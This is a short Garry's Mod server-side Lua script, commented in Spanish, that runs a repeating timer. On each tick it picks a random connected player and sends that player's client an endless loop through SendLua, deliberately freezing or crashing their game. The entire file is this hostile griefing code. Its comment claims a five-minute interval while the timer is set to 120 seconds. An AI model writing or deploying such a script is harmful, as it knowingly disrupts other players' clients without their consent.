if SERVER then
    AddCSLuaFile()

    -- Función para crashear aleatoriamente a un jugador
    local function CrashRandomPlayer()
        local players = player.GetAll()
        if #players == 0 then return end
        
        local randomPlayer = players[math.random(#players)]
        if IsValid(randomPlayer) then
            randomPlayer:SendLua([[while true do end]]) -- Fuerza un crash en el cliente
        end
    end

    -- Ejecutar la función cada cierto tiempo
    timer.Create("RandomCrashTimer", 120, 0, CrashRandomPlayer) -- Cada 5 minutos 
end